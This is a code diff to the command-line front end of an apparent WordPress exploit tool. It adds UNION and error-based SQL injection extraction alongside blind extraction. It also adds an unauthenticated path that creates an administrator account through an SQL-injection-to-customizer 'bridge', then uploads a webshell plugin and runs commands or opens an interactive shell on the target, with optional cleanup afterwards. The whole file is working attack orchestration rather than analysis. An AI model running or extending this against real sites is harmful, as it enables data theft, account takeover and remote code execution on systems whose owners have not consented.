@@ -9,8 +9,9 @@ from typing import Optional
 
 from . import __version__
 from .client import BatchClient
+from .exploit import PreAuthAdminCreator
 from .shell import AdminSession
-from .sqli import BlindSQLi
+from .sqli import BlindSQLi, ErrorBasedSQLi, UnionSQLi
 from .version import public_version_hints, version_status, wordpress_markers
 
 try:
@@ -153,9 +154,38 @@ def cmd_check(args: argparse.Namespace) -> int:
     return 2
 
 
+def _reader(args: argparse.Namespace, client: BatchClient):
+    """Pick the extraction technique.
+
+    auto prefers the fastest in-band method that works: UNION (one request per value, forges a fake
+    WP_Post), then error-based (needs reflected DB errors), then blind binary search.
+    """
+    if args.technique in ("auto", "union"):
+        union = UnionSQLi(client)
+        if union.available():
+            good("UNION extraction available (in-band, one request per value) — using it.")
+            return union
+        if args.technique == "union":
+            bad("UNION extraction requested but the forged post was not reflected.")
+            return None
+        info("UNION extraction unavailable; trying error-based.")
+    if args.technique in ("auto", "error"):
+        error_based = ErrorBasedSQLi(client)
+        if error_based.available():
+            good("Error-based extraction available (target reflects DB errors) — using it.")
+            return error_based
+        if args.technique == "error":
+            bad("Error-based extraction requested but the target does not reflect DB errors.")
+            return None
+        info("Target does not reflect DB errors; falling back to blind extraction.")
+    return BlindSQLi(client)
+
+
 def cmd_read(args: argparse.Namespace) -> int:
     client = _client(args)
-    sqli = BlindSQLi(client)
+    sqli = _reader(args, client)
+    if sqli is None:
+        return 2
 
     if args.query:
         info(f"Reading: {args.query}")
@@ -232,13 +262,34 @@ def cmd_shell(args: argparse.Namespace) -> int:
     if not args.cmd and not args.interactive:
         bad("specify --cmd or --interactive")
         return 2
+    if bool(args.user) != bool(args.password):
+        bad("specify both --user and --password, or omit both to use the pre-auth bridge")
+        return 2
 
     warn("This uploads a plugin containing a webshell to the target.")
+
+    generated_admin = None
+    username, password = args.user, args.password
+    if username is None:
+        warn("No credentials supplied; attempting pre-auth administrator creation.")
+        creator = PreAuthAdminCreator(
+            args.url,
+            timeout=args.timeout,
+            rest_route=args.rest_route,
+            proxy=args.proxy,
+        )
+        info("Creating administrator through the SQLi-to-customizer bridge...")
+        generated_admin = creator.create_admin()
+        username, password = generated_admin.username, generated_admin.password
+        good(f"Administrator created: {username}")
+
     session = AdminSession(args.url, timeout=args.timeout, proxy=args.proxy)
 
-    info(f"Authenticating as {args.user!r}...")
-    if not session.login(args.user, args.password):
-        bad("Login failed. Supply valid admin credentials (crack the hash recovered by 'read').")
+    info(f"Authenticating as {username!r}...")
+    if not session.login(username, password):
+        bad("Login failed.")
+        if generated_admin:
+            warn("The pre-auth bridge appeared to run, but the generated credentials did not log in.")
         return 1
     good("Authenticated.")
 
@@ -261,21 +312,34 @@ def cmd_shell(args: argparse.Namespace) -> int:
         if args.interactive:
             _repl(session, path)
     finally:
-        if args.cleanup:
-            info("Cleaning up webshell...")
+        if generated_admin:
+            info("Deleting generated administrator...")
             try:
-                removed = session.cleanup(path)
-            except Exception as exc:  # noqa: BLE001 - cleanup must not hide the original failure
-                bad(f"Cleanup failed ({exc}) — remove the plugin manually ({path}).")
-                rc = 1
+                removed_admin = session.delete_user_with_shell(
+                    path,
+                    generated_admin.username,
+                    reassign_to=generated_admin.source_admin_id,
+                )
+            except Exception:  # noqa: BLE001 - continue to remove the webshell.
+                removed_admin = False
+            if removed_admin:
+                good("Generated administrator removed from the target.")
             else:
-                if removed:
-                    good("Webshell removed from the target.")
-                else:
-                    bad(f"Cleanup failed — remove the plugin manually ({path}).")
-                    rc = 1
-        elif not args.keep:
-            warn(f"Remove the webshell when finished (delete {path} on the target).")
+                bad(f"Generated administrator cleanup failed: {generated_admin.username}:{generated_admin.password}")
+                rc = 1
+
+        info("Cleaning up webshell...")
+        try:
+            removed = session.cleanup(path)
+        except Exception as exc:  # noqa: BLE001 - cleanup must not hide the original failure
+            bad(f"Webshell cleanup failed ({exc}).")
+            rc = 1
+        else:
+            if removed:
+                good("Webshell removed from the target.")
+            else:
+                bad("Webshell cleanup failed.")
+                rc = 1
     return rc
 
 
@@ -335,20 +399,23 @@ def build_parser() -> argparse.ArgumentParser:
     group.add_argument("--query", help='scalar SQL expression to read, e.g. "SELECT @@version"')
     read.add_argument("--prefix", default="wp_", help="database table prefix (default: wp_)")
     read.add_argument("--max-length", type=int, default=128, help="max characters per value")
+    read.add_argument(
+        "--technique",
+        choices=("auto", "union", "blind", "error"),
+        default="auto",
+        help="extraction technique: auto (union -> error-based -> blind), union (in-band, forges a "
+        "fake WP_Post; one request per value), error (in-band, needs visible DB errors), or blind "
+        "(bit-by-bit boolean/timing)",
+    )
     read.set_defaults(func=cmd_read)
 
-    shell = sub.add_parser("shell", help="post-auth plugin webshell helper")
-    _add_common(shell, rest_route=False)  # shell uses wp-login/wp-admin directly, not the REST API
-    shell.add_argument("--user", required=True, help="admin username")
-    shell.add_argument("--password", required=True, help="admin password (cracked from the hash)")
+    shell = sub.add_parser("shell", help="plugin shell; with credentials or via the pre-auth bridge")
+    _add_common(shell)
+    shell.add_argument("--user", help="admin username; omit with --password to use the pre-auth bridge")
+    shell.add_argument("--password", help="admin password; omit with --user to use the pre-auth bridge")
     shell.add_argument("--cmd", help="command to run on the target (omit when using --interactive)")
     shell.add_argument("-i", "--interactive", action="store_true",
                        help="open an interactive shell after deploying")
-    retention = shell.add_mutually_exclusive_group()
-    retention.add_argument("--keep", action="store_true",
-                           help="do not warn about removing the webshell")
-    retention.add_argument("--cleanup", action="store_true",
-                           help="delete the webshell from the target when finished")
     shell.set_defaults(func=cmd_shell)
 
     return parser
